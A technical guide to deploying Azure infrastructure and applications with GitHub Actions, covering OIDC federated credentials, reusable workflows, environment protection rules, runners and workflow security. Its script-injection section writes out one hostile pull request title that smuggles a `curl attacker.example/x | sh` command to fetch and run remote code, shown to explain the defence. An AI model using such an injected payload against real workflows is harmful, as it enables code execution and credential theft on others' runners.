---
title: "GitHub Actions for Azure Deployments"
layout: guide
category: Azure
subcategory: Developer Tools & CI/CD
description: "Deploying Azure infrastructure and applications with GitHub Actions: OIDC federated credentials and subject claims, reusable workflow limits, deployment environments and protection rules, runner selection, and workflow security."
tags: [github-actions, oidc, workload-identity, reusable-workflows, deployment-environments, bicep, practical]
---
{% raw %}

## What Is GitHub Actions for Azure

[GitHub Actions](https://docs.github.com/en/actions){:target="_blank" rel="noopener noreferrer"} is GitHub's automation platform. Workflows defined in YAML respond to repository events (a push, a pull request, a schedule, a manual dispatch) and run jobs on runners. The [Azure GitHub Actions](https://github.com/Azure/actions){:target="_blank" rel="noopener noreferrer"} organization maintains actions for authenticating to Azure and deploying to Azure services, alongside a large marketplace of community actions.

Microsoft owns GitHub, so the Azure actions are first-party: maintained alongside the platform and updated in step with it. That is a genuine advantage, and also a reason to check versions rather than trust an example you found online, because the actions move.

---

## What Problems It Solves

**Without GitHub Actions:**
- Deployments run from the portal or from scripts stored outside the repository
- No consistent record of who deployed what, when, and from which commit
- Long-lived service principal secrets sit in scripts, configuration files, or a shared vault nobody audits
- Deployment logic diverges from the code it deploys
- Every team invents its own process

**With GitHub Actions:**
- Deployment defined in version control next to the code, reviewable in a pull request
- Deployment history and workflow logs give a per-environment record tied to a commit
- OIDC federated credentials remove stored Azure secrets entirely
- Environment protection rules gate production behind approvals and branch restrictions
- Reusable workflows give many repositories one shared deployment definition

---

## How It Compares to Azure Pipelines and AWS CodePipeline

Pick GitHub Actions when the code already lives in GitHub. Pick Azure Pipelines when you want source control, work tracking, and deployment on one platform, or when you need self-hosted agents with a longer operational track record. Pick CodePipeline when the workload and the team are AWS-centric.

| Concept | Azure Pipelines | AWS CodePipeline/CodeBuild | GitHub Actions |
|---------|-----------------|---------------------------|----------------|
| **Definition** | YAML (`azure-pipelines.yml`) | Console or CloudFormation | YAML in `.github/workflows/` |
| **Triggers** | Push, PR, scheduled, manual, resource | CodeCommit, S3, EventBridge, manual | Push, PR, scheduled, manual, webhook, repository events |
| **Compute billing** | Parallel jobs (concurrency), not minutes | CodeBuild per minute | Minutes, weighted by runner OS |
| **Included free tier** | 1 parallel job, 1,800 min/month, must be enabled | None | 2,000 min/month on Free, 3,000 on Team, 50,000 on Enterprise Cloud |
| **Azure authentication** | Service connection with workload identity federation | IAM roles assumed by CodeBuild | OIDC federated credential, service principal secret, or managed identity |
| **Deployment gates** | Approvals and checks on resources, outside the YAML | Manual approval actions | Environment protection rules, outside the YAML |
| **Deployment strategies** | Built in: runOnce, rolling, canary | CodeDeploy | Not built in; compose from jobs and environments |
| **Reuse** | Step, job, and stage templates plus `extends` | CloudFormation templates | Reusable workflows and composite actions |
| **Self-hosted compute** | Self-hosted agents, scale set agents, Managed DevOps Pools | EC2-based CodeBuild | Self-hosted runners, Actions Runner Controller on Kubernetes |
| **Multi-cloud** | Azure-first, works elsewhere | AWS-focused | Cloud-agnostic |

The row that catches people out is billing. Azure Pipelines charges for how many jobs run at once and lets a job run as long as it likes on a self-hosted agent. GitHub Actions charges for elapsed minutes, weighted by operating system, so a Windows job costs roughly 1.7 times a Linux one and a macOS job roughly ten times.

---

## Core Concepts

### Workflows, Jobs, and Steps

A workflow is a YAML file in `.github/workflows/`. It declares the events it responds to and the jobs it runs.

- **Events** decide when the workflow runs: `push`, `pull_request`, `schedule`, `workflow_dispatch`, `workflow_call`, and many repository events
- **Jobs** are units of work that run on a runner. Jobs run in parallel unless `needs` establishes a dependency
- **Steps** run sequentially within a job. A step is either a shell command (`run`) or an action (`uses`)

Each job gets a fresh runner. Files do not survive between jobs unless you pass them through artifacts or a cache, which is the most common surprise for people arriving from a single-agent pipeline model.

---

### Runners

A runner executes a job.

**GitHub-hosted runners** are ephemeral: created for one job, destroyed afterward. They come preloaded with common toolchains and are patched by GitHub. Standard GitHub-hosted runners are **free for public repositories** and draw on the included minutes for private ones.

**Larger runners** offer more cores, more memory, and static IP ranges. They are **always billed, including for public repositories**, and never draw on the included monthly minutes.

**Self-hosted runners** run on machines you own, which is what you need for private network access, specialized hardware, or a warm cache between jobs. **Actions Runner Controller** runs them as pods on Kubernetes, including AKS, which gets ephemeral, autoscaled runners without maintaining VMs.

```
              Does the job need private network access
              or hardware GitHub does not offer?
                              │
              ┌───────────────┴────────────────┐
             no                               yes
              │                                │
              v                                v
   Constrained by cores,              Do you already run
   memory, or a static IP?            Kubernetes?
              │                                │
       ┌──────┴──────┐                  ┌──────┴──────┐
      no            yes                yes           no
       │             │                  │             │
       v             v                  v             v
   Standard       Larger          Actions Runner   Self-hosted
   GitHub-hosted  runners         Controller       runners on VMs,
   runners        (always billed) (ephemeral pods) ephemeral where
                                                   possible
```

**Never attach a self-hosted runner to a public repository.** GitHub's own guidance is that self-hosted runners "should almost never be used for public repositories", because anyone can open a pull request and run code on your machine. A GitHub-hosted runner is destroyed afterward; a self-hosted one keeps whatever the attacker left behind.

---

### Actions

An action is a packaged unit of work referenced with `uses`. Actions are written in JavaScript, as a Docker container, or as a **composite action**, which bundles several steps into one action. A composite action is not a workflow. It has no jobs, no runner selection, and no triggers of its own.

Useful Azure actions:

| Action | Purpose |
|---|---|
| [Azure/login](https://github.com/Azure/login){:target="_blank" rel="noopener noreferrer"} | Authenticate to Azure. Currently **v3**. |
| [Azure/bicep-deploy](https://github.com/Azure/bicep-deploy){:target="_blank" rel="noopener noreferrer"} | Deploy Bicep or ARM templates, run what-if, and manage **deployment stacks** |
| [Azure/cli](https://github.com/Azure/cli){:target="_blank" rel="noopener noreferrer"} | Run Azure CLI commands in a pinned CLI version |
| [Azure/webapps-deploy](https://github.com/Azure/webapps-deploy){:target="_blank" rel="noopener noreferrer"} | Deploy to App Service |

`Azure/arm-deploy` was the previous deployment action and Azure directs new work to `Azure/bicep-deploy`, which is also the action that carries first-party deployment stack support. Deployment stacks matter for infrastructure workflows because they track a resource set explicitly and can delete or detach resources that leave it, which is the job ARM complete mode used to do.

---

### Secrets, Variables, and Scope

Secrets are encrypted and masked in logs. Variables are plain text, read through the `vars` context. Both exist at three scopes, and the narrower scope wins.

| Scope | Available to | Use for |
|---|---|---|
| **Organization** | Every repository you grant access to | Values genuinely shared, such as a registry hostname |
| **Repository** | Every workflow in that repository | Repository-specific configuration |
| **Environment** | Only jobs that declare `environment:`, and only **after that environment's protection rules pass** | Anything production-scoped |

That last row is the reason to reach for an environment rather than a conditional. A job that has not passed the required reviewers cannot read the production environment's secrets, so approval gates the credential and not just the deployment step.

Masking is not a boundary. A secret printed in a form the masker does not recognize, such as base64 or split across lines, appears in the log in clear text.

---

### GITHUB_TOKEN Permissions

Every workflow run gets an automatic `GITHUB_TOKEN` scoped to the repository. Its default permissions are a repository or organization setting, and GitHub recommends setting that default to read-only for contents, then raising permissions per job:

```yaml
permissions:
  contents: read
  id-token: write
```

This block is not optional decoration for Azure work. `id-token: write` is what allows the job to request an OIDC token at all, and without it `azure/login` fails no matter how correct the Azure side is.

---

## Azure Authentication

### OIDC Federated Credentials

The recommended pattern stores nothing. The workflow requests a short-lived OIDC token from GitHub and exchanges it for an Azure access token against a federated identity credential.

```
  GitHub Actions job                  Microsoft Entra ID              Azure ARM
  ──────────────────                  ──────────────────              ─────────
         │                                    │                            │
         │ 1. request OIDC token              │                            │
         │    (needs id-token: write)         │                            │
         v                                    │                            │
  ┌──────────────┐                            │                            │
  │ GitHub OIDC  │  2. JWT signed by          │                            │
  │  provider    │─────────────────────────>  │                            │
  └──────────────┘     token.actions.         │                            │
         │             githubusercontent.com  │                            │
         │                                    │                            │
         │                        3. match issuer + sub + aud              │
         │                           against a federated                   │
         │                           identity credential                   │
         │                                    │                            │
         │  4. Azure access token             │                            │
         │ <──────────────────────────────────│                            │
         │                                    │                            │
         │  5. deploy with that token         │                            │
         │ ───────────────────────────────────────────────────────────────>│
```

**Setup:**

1. Create an Entra ID app registration (or a user-assigned managed identity) and note its client ID and tenant ID
2. Add a federated identity credential with issuer `https://token.actions.githubusercontent.com`, audience `api://AzureADTokenExchange`, and a subject matching the workflow
3. Assign Azure RBAC roles to that identity, scoped to a resource group rather than a subscription where possible
4. Store the client ID, tenant ID, and subscription ID as secrets or variables and pass them to `azure/login`

```yaml
permissions:
  contents: read
  id-token: write

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: actions/checkout@<full-40-character-sha>   # v5
      - uses: azure/login@<full-40-character-sha>        # v3
        with:
          client-id: ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
```

**The subject claim is the whole security boundary.** It says which workflow may use this identity, and its format depends on what triggered the run:

| Scoped to | Subject value |
|---|---|
| A branch | `repo:ORG/REPO:ref:refs/heads/main` |
| A tag | `repo:ORG/REPO:ref:refs/tags/v1.2.0` |
| Any pull request | `repo:ORG/REPO:pull_request` |
| An environment | `repo:ORG/REPO:environment:production` |

Scoping to an environment is usually the right choice for deployment, because it composes with the environment's protection rules. A job that has not cleared required reviewers never reaches the environment, so it never presents a matching subject.

Five operational details that account for most of the time lost to this:

- **A wrong subject fails silently.** Entra creates the credential without complaint and the token exchange simply fails, with no error explaining that the subject did not match. Compare the string character by character.
- **Wildcards are not supported** in any federated credential property. One credential covers exactly one subject.
- **A maximum of 20 federated identity credentials** can be added to one app registration or user-assigned managed identity.
- **Propagation takes minutes.** A token request made immediately after creating the credential can fail with `AADSTS70021: No matching federated identity record found for presented assertion`. Wait and retry rather than assuming the configuration is wrong.
- **New repositories use a different subject format.** Repositories created after **15 July 2026** default to an immutable subject that embeds owner and repository IDs, in the shape `repo:OWNER@OWNER-ID/REPO@REPO-ID:ref:refs/heads/main`. Existing repositories keep the old format unless they opt in, and the immutable format is not available on GitHub Enterprise Server. A credential copied from an older repository will not match.

The Azure DevOps issuer retirement announced for 2027 applies to Azure DevOps service connections. It has nothing to do with GitHub Actions, which federates against GitHub's own issuer.

---

### Service Principal with a Client Secret

The older approach passes a JSON blob to `azure/login` through its `creds` input, holding `clientId`, `clientSecret`, `subscriptionId`, and `tenantId`, usually stored as a single `AZURE_CREDENTIALS` secret. It still works and is not recommended.

The trade-off is not really about setup effort, since the OIDC path skips secret creation entirely. It is that a client secret is valid until it expires or someone rotates it, so a leak is an incident with an open-ended window, and expiry produces a deployment outage at a time nobody chose.

Use it only where OIDC cannot be configured, such as a target that does not support workload identity federation.

---

### Managed Identity on Self-Hosted Runners

A self-hosted runner on an Azure VM or an AKS pod can carry a managed identity, so no credential travels through GitHub at all:

```yaml
- uses: azure/login@<full-40-character-sha>   # v3
  with:
    auth-type: IDENTITY
    client-id: ${{ vars.AZURE_CLIENT_ID }}    # user-assigned identity
    tenant-id: ${{ vars.AZURE_TENANT_ID }}
    subscription-id: ${{ vars.AZURE_SUBSCRIPTION_ID }}
```

`auth-type` defaults to `SERVICE_PRINCIPAL`; `IDENTITY` selects the managed identity path.

The security model shifts with this choice. With OIDC, the credential is bound to a subject claim identifying a specific workflow. With a runner managed identity, **every job that lands on that runner gets the same identity**, so isolation comes from which workflows can reach which runner group rather than from the credential itself.

---

## Reusable Workflows

A reusable workflow declares `on: workflow_call` with typed inputs, outputs, and secrets, and other workflows call it with `uses` at the job level. It is the mechanism for giving many repositories one deployment definition.

Reusable workflows and composite actions solve adjacent problems. A reusable workflow contributes whole jobs, so it chooses its own runner and can define several jobs with dependencies. A composite action contributes steps inside a job the caller already defined. Deployment logic that needs its own runner or its own environment belongs in a reusable workflow.

**Real constraints, which shape how far you can push composition:**

- **Ten levels of nesting**, meaning the top-level caller plus up to nine reusable workflows. Circular references are rejected.
- **Secrets pass only between directly connected workflows.** In a nested chain, a secret handed to the second level does not automatically reach the third.
- `secrets: inherit` passes the caller's secrets wholesale, and works only within the same organization or enterprise.
- **`on: workflow_call` does not support the `environment` keyword.** Environment-scoped secrets cannot be resolved by the reusable workflow itself. The calling job declares the environment and passes in what is needed.
- References use a **commit SHA (recommended), a release tag, or a branch**. Where a tag and a branch share a name, the tag wins.

That environment limitation is the one that reshapes designs. A shared deployment workflow cannot reach into the production environment on its own, so either the caller declares `environment: production` and passes credentials in, or the reusable workflow's jobs each declare the environment they target.

---

## Deployment Environments and Protection Rules

A GitHub environment is a named deployment target that carries protection rules, its own secrets and variables, and deployment history. Rules are configured in repository settings, not in the workflow YAML, so someone who can edit a workflow file cannot weaken them.

| Rule | Behavior |
|---|---|
| **Required reviewers** | Up to **6** people or teams. **Only one of them needs to approve** for the job to proceed. Optionally block reviewers from approving their own runs. |
| **Wait timer** | Delay the job by a configured period after it is triggered. |
| **Deployment branch policy** | Restrict which refs may deploy: all branches, protected branches only, or selected branches and tags matched by name patterns. |
| **Custom deployment protection rules** | Third-party GitHub Apps supplying their own gate, enabled per environment. |
| **Admin bypass control** | Organizations can disallow bypassing the configured rules, including by administrators. |

Two behaviors matter more than the list:

- **Environment secrets are released only after every rule passes.** The approval gates the credential, not merely the deployment step.
- **"Up to 6 reviewers, one approval" is not two-person review.** Naming six people does not require six approvals, or even two. Enforcing genuine dual control means restricting the reviewer list and pairing it with branch protection on the source branch, since a single named approver can self-serve unless self-review is disabled.

All configured rules must be satisfied before the job runs. GitHub does not publish an evaluation order among them, so do not design a workflow that depends on one rule being checked before another.

---

## Deployment Patterns

### Infrastructure Deployment

Infrastructure workflows differ from application workflows by showing what will change before changing it.

**Steps:**
1. Check out the repository
2. Authenticate with OIDC
3. Lint and build the Bicep, catching syntax errors before touching Azure
4. Run a what-if or validate operation and publish the output to the job summary
5. For production, let the environment's approval rule hold the job while a human reads that output
6. Apply

Two decisions shape whether this works in practice. Put the what-if in a job that runs **before** the job carrying `environment: production`, so approvers see the preview in the run they are approving rather than after they have approved it. And use deployment stacks through `Azure/bicep-deploy` where resources need removing when they leave the template, since a plain incremental deployment leaves orphans behind.

### Application Deployment

**Steps:**
1. Build and test
2. Build a container image tagged with the commit SHA
3. Push to Azure Container Registry
4. Update App Service, AKS, or Container Apps to that image
5. Run smoke tests against the deployed revision

Build the image once and promote that exact digest through environments. Rebuilding per environment means production runs bytes nobody tested. Tagging by commit SHA rather than by a moving tag makes the promotion auditable and the rollback obvious.

Authenticate to ACR through the same OIDC identity rather than storing registry credentials, since the identity already exists and a registry password is one more thing to rotate.

### Multi-Environment Promotion

**Pattern:**
1. A merge to `main` deploys to development automatically
2. The staging job declares `environment: staging`, which carries a branch policy limiting deployment to `main`
3. Automated tests run against staging
4. The production job declares `environment: production`, which carries required reviewers
5. Production rollout uses whatever progressive mechanism the target supports, such as App Service slots or an AKS rollout strategy

GitHub Actions has no built-in canary or rolling deployment strategy. Progressive rollout is composed from jobs, environments, and whatever the target service offers, rather than declared.

Give each environment its own federated credential subject (`repo:ORG/REPO:environment:staging` and `...:environment:production`) and its own RBAC scope. With 20 federated credentials available per identity, a handful of environments fits comfortably on one app registration, though separate registrations per environment give a cleaner blast radius.

---

## Architecture Patterns

### Path Filters in a Mono-Repo

When one repository holds several independent components, `paths` filters on the trigger keep unrelated workflows from running:

- Infrastructure changes under `infrastructure/` trigger only the infrastructure workflow
- Application changes under `apps/myapp/` trigger only that application's workflow
- Shared library changes need explicit handling, because a path filter cannot know which consumers a change affects

Path filters interact awkwardly with required status checks. A check that never runs because its path filter did not match stays pending, which blocks merges unless the check is made conditional rather than filtered out.

### Reusable Workflow Libraries

A dedicated repository holds shared workflows that every service references:

- Clear typed inputs and outputs, so callers get a validated contract rather than a guess
- Documentation covering required secrets and permissions
- Consumers reference a **tag or SHA**, not a branch

That last point decides who controls rollout. Referencing `@main` means a change to the shared workflow reaches every consumer on their next run, which is excellent for pushing out a security fix and dangerous for everything else. Referencing a tag means consumers adopt changes deliberately.

### Matrix Strategies

A matrix runs one job definition across several configurations: deploying to multiple regions, or testing against several runtime versions. Add `fail-fast: false` when the point is to see every result rather than stop at the first failure, and `max-parallel` when the target cannot absorb simultaneous deployments.

A matrix over environments is a common shape and a trap: matrix jobs run in parallel by default, so a matrix over dev, staging, and production deploys to all three at once rather than promoting through them. Sequential promotion needs separate jobs with `needs`.

### Workflow Composition

A top-level workflow calls several reusable workflows in sequence, each with one responsibility: validate infrastructure, deploy infrastructure, build the application, deploy the application, run integration tests. The orchestration and its dependencies live in one file, and each piece stays independently testable. Keep the depth well inside the ten-level limit, since debugging a chain that deep is its own problem.

---

## Security

### OIDC Instead of Stored Secrets

An OIDC token is minted for a single job and expires immediately after. A service principal secret is valid until rotated. Beyond lifetime, the federated credential's subject claim constrains **which workflow** may authenticate, which no stored secret can express: a secret works for anyone who can read it.

Migrate existing workflows rather than only new ones. A repository with both an `AZURE_CREDENTIALS` secret and OIDC configured still has the secret, and the secret is what an attacker will use.

### Scope Credentials by Environment

Give development and production separate identities and separate RBAC scope. Combined with environment-scoped secrets, a workflow that never declares `environment: production` cannot obtain production credentials even if it is compromised.

Scope RBAC to the resource group the workflow actually deploys to. Contributor at subscription scope is the common default and is almost never what the workflow needs.

### Pin Actions to a Commit SHA

Tags move. An attacker who compromises an action's repository can repoint `v1` at malicious code, and every workflow referencing `v1` picks it up on the next run.

GitHub's guidance is unambiguous: pinning to a **full-length commit SHA is the only way to use an action as an immutable release**. Tags are acceptable only for creators you trust, particularly those carrying the Marketplace verified creator badge.

Do not split this by how important the action seems. A linter action runs in the same job, with the same token and the same filesystem, as the deployment action next to it. Microsoft's own Azure documentation pins `azure/login` by SHA. Add a trailing comment naming the version so the reference stays readable, and let Dependabot raise the update pull requests.

### Guard Against Script Injection

Attacker-controlled text reaches your workflow through pull request titles, branch names, issue bodies, and commit messages. Interpolating it directly into a shell step executes it:

```yaml
# Dangerous: the title is substituted into the script before the shell runs
- run: echo "Reviewing ${{ github.event.pull_request.title }}"
```

A pull request titled `"; curl attacker.example/x | sh; #` runs on your runner with your token. Two mitigations, both from GitHub's guidance:

- **Pass untrusted values through environment variables**, so the shell receives them as data rather than as script text:

```yaml
- run: echo "Reviewing $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

- **Pass them as action inputs** rather than into inline scripts.

Check every workflow that reads `github.event`, because the vulnerable form reads perfectly naturally.

### Self-Hosted Runner Security

Self-hosted runners execute whatever a workflow tells them to, on hardware you own and probably on a network you care about.

- **Never attach one to a public repository.** Any user can open a pull request and run code on it.
- Prefer **ephemeral** runners, destroyed after each job. Actions Runner Controller does this by default on Kubernetes.
- Place runners on isolated network segments, not alongside production systems.
- Scope the runner's managed identity narrowly, remembering that every workflow reaching that runner inherits it.
- Use runner groups to control which repositories and workflows can reach which runners.

### Default GITHUB_TOKEN to Read-Only

Set the organization or repository default for `GITHUB_TOKEN` to read access on contents, then raise permissions per job. A workflow that only builds and deploys to Azure rarely needs write access to the repository, and a compromised action in such a workflow cannot push commits or open releases.

---

## Common Pitfalls

### Pitfall 1: OIDC Configured Correctly on Both Sides and Still Failing

**Problem:** The app registration exists, the federated credential is created, RBAC is assigned, and `azure/login` fails with an unhelpful message.

**Result:** Hours lost re-checking Azure configuration that was never wrong.

**Solution:** Check three things in order. First, the workflow needs `permissions: id-token: write` at workflow or job level. Without it, no OIDC token is minted at all. Second, compare the subject claim character by character against the trigger, remembering that a branch, a tag, a pull request, and an environment produce four different formats, and that repositories created after 15 July 2026 use the immutable format embedding owner and repository IDs. A wrong subject produces no configuration error at all, only a failed exchange. Third, if the credential is new, wait a few minutes. `AADSTS70021` immediately after creation is propagation delay, not misconfiguration.

---

### Pitfall 2: Deploying to Production With No Gate

**Problem:** A merge to `main` runs the deployment job straight through to production.

**Result:** A bug reaches users before anyone reads the build summary, and there is no record of a decision to ship.

**Solution:** Declare `environment: production` on the deployment job and configure required reviewers plus a deployment branch policy on that environment. Because environment secrets are released only after the rules pass, the approval gates the credential rather than just the step. Remember that naming six reviewers still requires only one approval, so restrict the list and disable self-review if you need meaningful review.

---

### Pitfall 3: Approving a Deployment Without Seeing What Changes

**Problem:** The infrastructure workflow runs what-if inside the same job that applies, after the approval.

**Result:** Approvers are asked to authorize a change they cannot see. Approval becomes a formality, and orphaned resources accumulate because nobody notices what the template stopped managing.

**Solution:** Put validation and what-if in a job that runs before the gated job, and publish the output to the job summary so it is visible in the run being approved. Where resources must be removed when they leave the template, use deployment stacks through `Azure/bicep-deploy` rather than expecting an incremental deployment to clean up.

---

### Pitfall 4: One Identity for Every Environment

**Problem:** A single app registration with subscription-scoped Contributor serves development, staging, and production.

**Result:** Compromising the least-protected workflow yields production access. The blast radius of a development mistake is the whole subscription.

**Solution:** Give each environment its own federated credential subject (`repo:ORG/REPO:environment:production`) and RBAC scoped to the resource groups that environment owns. One app registration holds up to 20 federated credentials, so a handful of environments fits on a single identity. A registration per environment isolates them further. Pair this with environment-scoped secrets so a workflow that never declares the environment cannot reach its credentials.

---

### Pitfall 5: Untrusted Input Interpolated Into a Script

**Problem:** A workflow echoes `${{ github.event.pull_request.title }}` or a branch name into a `run` step.

**Result:** A crafted pull request title executes arbitrary commands on the runner, with access to the job's token and any credentials already loaded.

**Solution:** Never interpolate `github.event` values directly into shell script. Bind them to `env` variables and reference them as shell variables, or pass them as inputs to an action. Audit every workflow that reads pull request or issue content, including workflows nobody has touched in a year.

---

### Pitfall 6: Actions Pinned to Moving Tags

**Problem:** Workflows reference `azure/login@v1` and a dozen marketplace actions by tag.

**Result:** A compromised or repointed tag runs attacker code inside a job holding Azure credentials, and nothing in the repository changed to show it. In this specific case there is also a correctness problem: `azure/login` is at v3, so a workflow on v1 is missing years of fixes.

**Solution:** Pin every action to a full-length commit SHA with a version comment, and let Dependabot propose updates. Apply this to all actions, not the ones that look important, since every action in a job shares that job's token and filesystem.

---

### Pitfall 7: Reusable Workflows That Cannot Reach the Environment

**Problem:** A shared deployment workflow is written to declare `environment: production` itself, so every consumer inherits the gate for free.

**Result:** It does not work. `on: workflow_call` does not support the `environment` keyword, and in a nested chain secrets pass only between directly connected workflows, so a credential handed in two levels up never arrives.

**Solution:** Have the **calling** job declare the environment and pass what the reusable workflow needs through `secrets` or `secrets: inherit`. Keep chains shallow, well inside the ten-level limit. Give the reusable workflow typed inputs and documented required secrets, so a caller wiring it up incorrectly fails with a clear message.

---

## Key Takeaways

1. **`id-token: write` plus a correct subject claim is the whole of OIDC setup, and both fail quietly.** Without the permission no token is minted. With a mismatched subject, Entra creates the credential happily and the exchange fails with nothing explaining why.

2. **The subject claim format depends on the trigger.** Branch, tag, pull request, and environment produce four different strings, and repositories created after 15 July 2026 use an immutable format embedding owner and repository IDs. A credential copied from an older repository will not match.

3. **Scope federated credentials by environment.** `repo:ORG/REPO:environment:production` composes with the environment's protection rules, so a job that has not cleared review never presents a matching subject. Wildcards are unsupported and one identity holds at most 20 credentials.

4. **Environment secrets are released only after protection rules pass.** That makes an environment a gate on the credential, not just on the deployment step, which is what separates it from a conditional in the YAML.

5. **Required reviewers allows up to six names and needs one approval.** Listing a team does not create dual control. Restrict the list and disable self-review if review is meant to be real.

6. **Reusable workflows cannot declare an environment.** `on: workflow_call` does not support the keyword, and secrets pass only between directly connected workflows. The caller owns the environment declaration.

7. **Pin every action to a full-length commit SHA.** It is the only immutable reference GitHub offers. Splitting the rule by perceived importance does not help, because every action in a job shares that job's token.

8. **Treat `github.event` content as attacker-controlled.** Interpolating a pull request title into a `run` step is remote code execution on your runner. Pass it through `env` instead.

9. **Never point a self-hosted runner at a public repository**, and prefer ephemeral runners everywhere else. A runner managed identity is shared by every job that lands on it, so isolation comes from runner groups rather than the credential.

10. **Billing is elapsed minutes weighted by OS, not concurrency.** Windows costs roughly 1.7 times Linux and macOS roughly ten times. Larger runners are always billed, including on public repositories, and never draw on included minutes.
{% endraw %}
